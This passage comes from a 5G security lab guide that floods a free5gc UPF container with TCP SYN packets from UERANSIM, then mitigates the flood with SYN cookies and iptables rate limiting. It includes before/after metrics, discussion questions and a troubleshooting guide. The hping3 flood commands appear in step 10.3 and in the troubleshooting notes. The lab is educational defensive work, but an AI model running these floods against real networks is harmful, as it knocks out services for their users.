| `frame.time_delta < 0.0001` | Packets arriving < 0.1ms apart (flood) |

**Statistics to check:**

1. **Statistics > Conversations > TCP tab**: Shows thousands of unique source-port conversations, all to port 80.
2. **Statistics > I/O Graphs** (Y: Packets/s): Shows vertical spike from 0 to ~29K pps when flood starts.
3. **Statistics > Protocol Hierarchy**: TCP should be 99%+ of all traffic.

---

## Step 10 — Mitigation and Recovery

### 10.1 Re-enable SYN Cookies

```bash
docker exec upf sysctl -w net.ipv4.tcp_syncookies=1
docker exec upf sysctl -w net.ipv4.tcp_max_syn_backlog=1024
```

### 10.2 Apply iptables Rate Limiting

```bash
docker exec upf iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT
docker exec upf iptables -A INPUT -p tcp --syn -j DROP
```

**Actual verification log:**

```
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0    tcp flags:0x17/0x02 limit: avg 10/sec burst 20
    0     0 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0    tcp flags:0x17/0x02
```

### 10.3 Re-Run Attack (Prove Mitigation Works)

```bash
# Start a new capture
docker exec upf bash -c "tcpdump -i eth0 -w /tmp/dos_mitigated_capture.pcap tcp -Z root &"
sleep 2

# Launch 15-second attack
docker exec -d ueransim bash -c "timeout 15 hping3 -S --flood -p 80 $UPF_IP > /tmp/hping3_mitigated.txt 2>&1"
```

**Actual iptables counters during mitigated attack:**

```
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
  134  5360 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0    tcp flags:0x17/0x02 limit: avg 10/sec burst 20
 627K   25M DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0    tcp flags:0x17/0x02
```

**Final iptables counters (after full 15s attack):**

```
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
  169  6760 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0    tcp flags:0x17/0x02 limit: avg 10/sec burst 20
 813K   33M DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0    tcp flags:0x17/0x02
```

**Legitimate traffic during mitigated attack:**

```
PING 8.8.8.8 (8.8.8.8) from 10.60.0.1 uesimtun0: 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=21.2 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=22.6 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=111 time=18.6 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 18.587/20.808/22.599/1.666 ms
```

### 10.4 Extract the Mitigated PCAP

```bash
docker exec upf killall tcpdump
docker cp upf:/tmp/dos_mitigated_capture.pcap ./dos_mitigated_capture.pcap
```

### 10.5 Verify Recovery

```bash
docker stats upf --no-stream
docker exec upf ss -tn state syn-recv | wc -l
docker exec ueransim ping -c 5 -I uesimtun0 8.8.8.8
```

**Actual post-recovery log:**

```
CONTAINER ID   NAME   CPU %   MEM USAGE / LIMIT     MEM %   NET I/O           BLOCK I/O       PIDS
0d3ad3aede18   upf    0.06%   72.71MiB / 251.5GiB   0.03%   94.2MB / 47.4MB   133MB / 636MB   29

SYN_RECV connections: 0

PING 8.8.8.8 (8.8.8.8) from 10.60.0.1 uesimtun0: 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=17.4 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=22.1 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=111 time=20.3 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=111 time=18.1 ms
64 bytes from 8.8.8.8: icmp_seq=5 ttl=111 time=19.7 ms

--- 8.8.8.8 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 17.439/19.527/22.119/1.654 ms
```

### 10.6 Clean Up iptables Rules

```bash
docker exec upf iptables -F INPUT
```

---

## Before vs. After — Full Comparison

### Resource Impact

```
  ┌───────────────────────────────────────────────────────────────────────────┐
  │                                                                           │
  │   UPF CPU (%)                    UPF Memory (MiB)                        │
  │                                                                           │
  │   5 ┤                             80 ┤  ████████                          │
  │     │  ██ 4.18%                      │  ████████ 78.0                     │
  │   4 ┤  ██                          70 ┤  ████████         ████████        │
  │     │  ██                             │  ████████         ████████ 72.7   │
  │   3 ┤  ██                          60 ┤  ████████         ████████        │
  │     │  ██                             │  ████████         ████████        │
  │   2 ┤  ██     ██ 1.79%            50 ┤  ████████         ████████        │
  │     │  ██     ██                      │  ████████         ████████        │
  │   1 ┤  ██     ██                   40 ┤  ████████         ████████        │
  │     │  ██     ██    ▪ 0.06%           │  ████████         ████████        │
  │   0 ┤──██─────██────▪──────        30 ┤  ████████         ████████        │
  │     ▪ 0.00%                        20 ┤  ████████         ████████        │
  │     │                                 │▪▪████████▪▪▪▪▪▪▪▪████████        │
  │     └──┬──────┬─────┬──────           │ 17.0                              │
  │     Baseline  Unmit  Mitigated Post   └──┬──────────┬─────────┬───────   │
  │              Attack  Attack   Attack     Baseline   During    Post        │
  │                                                     Attack    Attack      │
  └───────────────────────────────────────────────────────────────────────────┘
```

### Packet Processing

```
  ┌─────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │   Packets Reaching UPF Kernel                                   │
  │                                                                  │
  │   900K ┤  ████████  876,601                                     │
  │        │  ████████                                               │
  │   800K ┤  ████████                                               │
  │        │  ████████                                               │
  │   600K ┤  ████████                                               │
  │        │  ████████                                               │
  │   400K ┤  ████████                                               │
  │        │  ████████                                               │
  │   200K ┤  ████████                                               │
  │        │  ████████                                               │
  │      0 ┤──████████────▪──────                                    │
  │        │           169 (0.02%)                                   │
  │        └──────┬────────┬─────                                    │
  │          Unmitigated  Mitigated                                  │
  │                                                                  │
  └─────────────────────────────────────────────────────────────────┘
```

### Full Summary Table

| Metric | Baseline | During Attack (Unmitigated) | During Attack (Mitigated) | Post-Recovery |
|--------|----------|-----------------------------|---------------------------|---------------|
| **UPF CPU** | 0.00% | 4.18% | 1.79% | 0.06% |
| **UPF Memory** | 17.02 MiB | 77.98 MiB (+358%) | 73.03 MiB | 72.71 MiB |
| **Network I/O (in)** | 19.1 kB | 50.3 MB (+2,633x) | 83.8 MB | 94.2 MB |
| **SYN packets sent** | — | 876,389 | 812,966 | — |
| **Packets reaching kernel** | — | 876,601 (100%) | 169 (0.02%) | — |
| **RST packets sent by UPF** | — | 876,110 | 170 | — |
| **SYN packets dropped** | — | 0 | 813,000+ (99.98%) | — |
| **SYN_RECV connections** | 0 | low (no service on :80) | 0 | 0 |
| **Ping RTT (uesimtun0)** | 19.3 ms | 20.1 ms | 20.8 ms | 19.5 ms |
| **Ping loss (uesimtun0)** | 0% | 0% | 0% | 0% |
| **PCAP file size** | — | 118 MB | 55 MB | — |
| **PCAP total packets** | — | 1,752,340 | 813,137 | — |

---

## Discussion Questions

### Attack Mechanics

1. **Resource Exhaustion**: Why does a SYN flood cause the UPF to stop responding? What specific kernel data structure is being filled?
2. **Half-Open Connections**: Explain the TCP 3-way handshake. At which step does the SYN flood stop? Why does this consume server resources?
3. **Source Port Randomization**: Why does `hping3` randomize source ports? How does this bypass simple IP-based blocking?
4. **RST Response**: We observed 876,110 RST-ACK packets from the UPF. Why does the kernel send RSTs? Is this itself a resource drain?

### 5G Context

5. **N3 Interface**: In a real 5G network, the N3 interface uses GTP-U (UDP 2152), not raw TCP. How would a UDP flood differ from a TCP SYN flood in terms of impact and detection?
6. **UPF Role**: The UPF processes all user-plane traffic. If the UPF is overwhelmed, what is the impact on all UEs connected to this cell?
7. **Service Degradation**: We observed that pings through `uesimtun0` were unaffected. Why? Under what conditions would data-plane traffic be disrupted?

### Mitigation Strategies

8. **SYN Cookies**: Explain how SYN cookies work. Why did re-enabling them reduce the impact of the flood?
9. **Rate Limiting**: The `iptables` rule limited SYN packets to 10/s. What are the trade-offs of this threshold?
10. **IDS/IPS**: How would an Intrusion Detection System (e.g., Snort, Suricata) detect this attack? What signature would you write based on the PCAP indicators (window size 512, sequential ports)?
11. **Network Slicing**: Could network slicing isolate the impact of a DoS attack to a single slice?

### Forensics

12. **PCAP Evidence**: If you were a forensic analyst, what three things in the PCAP would you use to prove a SYN flood occurred?
13. **Attribution**: Can you determine the real attacker from the PCAP if `--rand-source` was used? Why or why not?
14. **PCAP Diff**: Compare the two PCAPs. Why does the mitigated capture show 812,968 SYN packets but only 170 RST responses? Where did the other 812,798 SYN packets go?

---

## Validation Checklist

### Lab Setup

- [ ] All free5gc containers are running (`docker compose ps` shows all `Up`)
- [ ] gNB NG Setup is successful (`docker logs ueransim` shows "NG Setup procedure is successful")
- [ ] UE is registered and has a PDU session (`uesimtun0` exists with IP `10.60.0.x`)
- [ ] Baseline ping to `8.8.8.8` via `uesimtun0` succeeds with 0% loss
- [ ] UPF IP and UERANSIM IP are recorded

### Tool Installation

- [ ] `tcpdump` installed in UPF container (`docker exec upf tcpdump --version`)
- [ ] `procps` installed in UPF container (`docker exec upf sysctl --version`)
- [ ] `hping3` installed in UERANSIM container (`docker exec ueransim hping3 --version`)

### Attack Execution

- [ ] `tcpdump` capture is running on the UPF before the attack starts
- [ ] SYN cookies are disabled on the UPF (`tcp_syncookies=0`)
- [ ] SYN backlog reduced (`tcp_max_syn_backlog=128`)
- [ ] `hping3` SYN flood runs for 30 seconds
- [ ] Attack results show ~876K packets transmitted
- [ ] UPF CPU spike observed via `docker stats` (expect 2-5%)
- [ ] UPF memory increase observed (expect 4-5x baseline)

### Analysis

- [ ] PCAP file extracted from the UPF container (expect ~100+ MB)
- [ ] Wireshark filter `tcp.flags.syn == 1 && tcp.flags.ack == 0` shows massive SYN count
- [ ] SYN:RST ratio is approximately 1:1 in unmitigated PCAP
- [ ] TCP kernel counters show InSegs matching OutRsts

### Mitigation

- [ ] SYN cookies re-enabled (`tcp_syncookies=1`)
- [ ] iptables rate-limiting rule applied and verified
- [ ] Mitigated attack shows 99%+ DROP rate in iptables counters
- [ ] RST count in mitigated PCAP is << SYN count (170 vs 812,968)
- [ ] Legitimate traffic via `uesimtun0` survives during mitigated attack (0% loss)
- [ ] Post-attack: SYN_RECV = 0, ping works, CPU returns to baseline

### Conceptual Understanding

- [ ] Student can explain why SYN floods exhaust resources
- [ ] Student can explain how SYN cookies mitigate the attack
- [ ] Student can explain why iptables rate limiting dropped 99.98% of packets
- [ ] Student can explain the difference between the two PCAPs
- [ ] Student can identify hping3 signatures in a PCAP (window=512, sequential ports)

---

## Troubleshooting Guide

This section documents every issue encountered during the actual lab run and how to resolve each one. If you hit a problem, check here first.

---

### TS-1: `tcpdump` Not Found in UPF Container

**Symptom:**

```
$ docker exec -d upf tcpdump -i eth0 -w /tmp/dos_attack_capture.pcap tcp
Error response from daemon: OCI runtime exec failed: exec failed: unable to start container
process: exec: "tcpdump": executable file not found in $PATH
```

**Cause**: The `free5gc/upf:v4.1.0` image is a minimal Debian (bullseye) image and does not include `tcpdump`.

**Fix:**

```bash
docker exec upf bash -c "apt-get update -qq && apt-get install -y -qq tcpdump"
```

**Verification:**

```bash
docker exec upf tcpdump --version
# Expected: tcpdump version 4.99.0
```

---

### TS-2: `sysctl` Not Found in UPF Container

**Symptom:**

```
$ docker exec upf sysctl net.ipv4.tcp_syncookies
OCI runtime exec failed: exec failed: unable to start container process:
exec: "sysctl": executable file not found in $PATH
```

**Cause**: The `procps` package (which provides `sysctl` and `ps`) is not installed in the UPF image.

**Fix:**

```bash
docker exec upf bash -c "apt-get install -y -qq procps"
```

> **Note**: You may see a non-fatal warning during installation:
> ```
> insserv: FATAL: service mountkernfs has to be enabled to use service procps
> ```
> This warning can be safely ignored. It only affects sysvinit service ordering, which is not used inside Docker containers.

**Verification:**

```bash
docker exec upf sysctl --version
# Expected: procps-ng 3.3.17
```

---

### TS-3: `tcpdump` Permission Denied

**Symptom:**

```
$ docker exec upf bash -c "nohup tcpdump -i eth0 -w /tmp/dos_attack_capture.pcap tcp &"
tcpdump: /tmp/dos_attack_capture.pcap: Permission denied
```

Yet the file is created:

```
-rw-r--r-- 1 tcpdump tcpdump 0 Feb 16 08:55 /tmp/dos_attack_capture.pcap
```

**Cause**: By default, `tcpdump` drops privileges to the `tcpdump` user after opening the capture socket. This user cannot write to `/tmp` in some container configurations.

**Fix**: Use the `-Z root` flag to prevent privilege dropping:

```bash
docker exec upf bash -c "tcpdump -i eth0 -w /tmp/dos_attack_capture.pcap tcp -Z root &"
```

**Verification:**

```bash
docker exec upf ls -la /tmp/dos_attack_capture.pcap
# Should show: -rw-r--r-- 1 root root ... dos_attack_capture.pcap
```

---

### TS-4: `hping3` Installation Fails

**Symptom (Debian-based image):**

```
E: Unable to locate package hping3
```

**Fix**: Run `apt-get update` first:

```bash
docker exec ueransim bash -c "apt-get update && apt-get install -y hping3"
```

**Symptom (Alpine-based image):**

```
bash: apt-get: command not found
```

**Fix**: Use Alpine's package manager:

```bash
docker exec ueransim sh -c "apk add --no-cache hping3"
```

**How to tell which base image**: 

```bash
docker exec ueransim cat /etc/os-release
# Debian: ID=debian
# Alpine: ID=alpine
```

---

### TS-5: `docker exec -d` Does Not Background `tcpdump` Properly

**Symptom**: You run `docker exec -d upf tcpdump ...` but the capture file remains 0 bytes or `tcpdump` exits silently.

**Cause**: The `-d` flag detaches the exec session, but some versions of Docker/containerd do not properly redirect stdout/stderr for detached processes, causing them to die when the exec session closes.

**Fix**: Use shell-level backgrounding instead:

```bash
# Do NOT use: docker exec -d upf tcpdump ...
# Instead use:
docker exec upf bash -c "tcpdump -i eth0 -w /tmp/dos_attack_capture.pcap tcp -Z root &"
```

**Verification** (since `ps` may not be installed):

```bash
# Use docker top from the HOST (not from inside the container)
docker top upf | grep tcpdump
```

---

### TS-6: `ps` Command Not Found in UPF Container

**Symptom:**

```
$ docker exec upf ps aux | grep tcpdump
bash: ps: command not found
```

**Cause**: `ps` is part of the `procps` package, which is not installed by default.

**Fix**: Install `procps` (same fix as TS-2):

```bash
docker exec upf bash -c "apt-get install -y -qq procps"
```

**Alternative** (without installing anything): Use `docker top` from the host:

```bash
docker top upf | grep tcpdump
```

---

### TS-7: gNB NG Setup Fails (Registration Timeout)

**Symptom:**

```
[sctp] [info] Trying to establish SCTP connection... (10.100.200.16:38412)
... (hangs or times out)
```

**Cause**: The AMF is not ready yet, or SCTP is blocked.

**Fix**:

1. Wait longer. The AMF takes 10-20 seconds to fully initialize after `docker compose up -d`.
2. Restart just the UERANSIM container:
   ```bash
   docker compose restart ueransim
   ```
3. Check AMF logs:
   ```bash
   docker logs amf | tail -20
   ```

---

### TS-8: `uesimtun0` Interface Does Not Appear

**Symptom:**

```
$ docker exec ueransim ip addr show uesimtun0
Device "uesimtun0" does not exist.
```

**Cause**: The UE registration or PDU session establishment failed.

**Fix**:

1. Check if UE is running:
   ```bash
   docker top ueransim | grep nr-ue
   ```
2. If not running, start it:
   ```bash
   docker exec -d ueransim ./nr-ue -c ./config/uecfg.yaml
   sleep 5
   ```
3. If it exits immediately, check subscriber provisioning:
   ```bash
   # Open WebUI at http://localhost:5000
   # Verify IMSI 208930000000001 is registered
   # Default credentials: admin / free5gc
   ```
4. Ensure `/dev/net/tun` is available:
   ```bash
   docker exec ueransim ls -la /dev/net/tun
   # Expected: crw-rw-rw- 1 root root 10, 200 ...
   ```

---

### TS-9: Ping via `uesimtun0` Fails (100% Packet Loss)

**Symptom:**

```
$ docker exec ueransim ping -c 3 -I uesimtun0 8.8.8.8
PING 8.8.8.8 ... 0 packets received, 100% packet loss
```

**Cause**: IP forwarding or NAT is not configured on the UPF.

**Fix**:

1. Check the UPF's iptables NAT rules:
   ```bash
   docker exec upf iptables -t nat -L -n
   ```
2. Verify IP forwarding is enabled:
   ```bash
   docker exec upf sysctl net.ipv4.ip_forward
   # Should be: net.ipv4.ip_forward = 1
   ```
3. Check that the UPF's `upf-iptables.sh` ran successfully:
   ```bash
   docker logs upf 2>&1 | head -5
   ```

---

### TS-10: `docker compose up` Warning About `version` Attribute

**Symptom:**

```
WARN[0000] /home/arjit/ISEA/free5gc-compose/docker-compose.yaml: the attribute `version` is obsolete,
it will be ignored, please remove it to avoid potential confusion
```

**Cause**: Docker Compose v2 no longer uses the `version` key in `docker-compose.yaml`. It is ignored but produces a warning.

**Fix**: This is cosmetic and does not affect functionality. To suppress it, remove line 1 from `docker-compose.yaml`:

```bash
# Optional: Remove the obsolete version line
sed -i '1d' docker-compose.yaml
```

---

### TS-11: PCAP File Is Too Large / Disk Full

**Symptom**: `tcpdump` stops writing or the container runs out of space.

**Cause**: A 30-second SYN flood at ~29K pps generates ~118 MB. Longer attacks or higher rates will generate more.

**Fix**:

1. Use a shorter attack duration:
   ```bash
   docker exec -d ueransim bash -c "timeout 10 hping3 -S --flood -p 80 $UPF_IP"
   ```
2. Use `tcpdump` with a packet count limit:
   ```bash
   docker exec upf bash -c "tcpdump -i eth0 -w /tmp/capture.pcap -c 100000 tcp -Z root &"
   ```
3. Use a snap length to capture only headers:
   ```bash
   docker exec upf bash -c "tcpdump -i eth0 -w /tmp/capture.pcap -s 96 tcp -Z root &"
   ```

---

### TS-12: Cannot Run Commands — "Container Is Not Running"

**Symptom:**

```
Error response from daemon: Container xyz is not running
```

**Cause**: The container crashed or was stopped.

**Fix**:

```bash
# Check status
docker compose ps

# Restart the specific container
docker compose restart free5gc-upf    # or whichever service

# Check why it crashed
docker logs upf --tail 50
```

---

### Quick-Fix Command Reference

For convenience, here are all the prerequisite installations in one block. Run these after `docker compose up -d` and before starting the lab:

```bash
# === Run this ONCE after starting the environment ===

# Install tools in UPF container
docker exec upf bash -c "apt-get update -qq && apt-get install -y -qq tcpdump procps"

# Install tools in UERANSIM container
docker exec ueransim bash -c "apt-get update -qq && apt-get install -y -qq hping3"

# Start the UE
docker exec -d ueransim ./nr-ue -c ./config/uecfg.yaml
sleep 5

# Verify everything is ready
echo "--- UPF tools ---"
docker exec upf tcpdump --version 2>&1 | head -1
docker exec upf sysctl --version 2>&1 | head -1
echo "--- UERANSIM tools ---"
docker exec ueransim hping3 --version 2>&1 | head -1
echo "--- UE tunnel ---"
docker exec ueransim ip addr show uesimtun0 2>&1 | grep inet
echo "--- Data plane test ---"
docker exec ueransim ping -c 1 -I uesimtun0 8.8.8.8 2>&1 | grep "bytes from"
```

**Expected output:**

```
--- UPF tools ---
tcpdump version 4.99.0
sysctl from procps-ng 3.3.17
--- UERANSIM tools ---
hping3: invalid option -- '-'  (this is normal — hping3 has no --version flag)
--- UE tunnel ---
    inet 10.60.0.1/16 scope global uesimtun0
--- Data plane test ---
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=18.4 ms
```

If any of the above fail, refer to the corresponding troubleshooting section above.

---

> **Reminder**: This lab is for **educational purposes only** within a controlled, isolated Docker environment. Never perform denial-of-service attacks on production networks or systems you do not own.
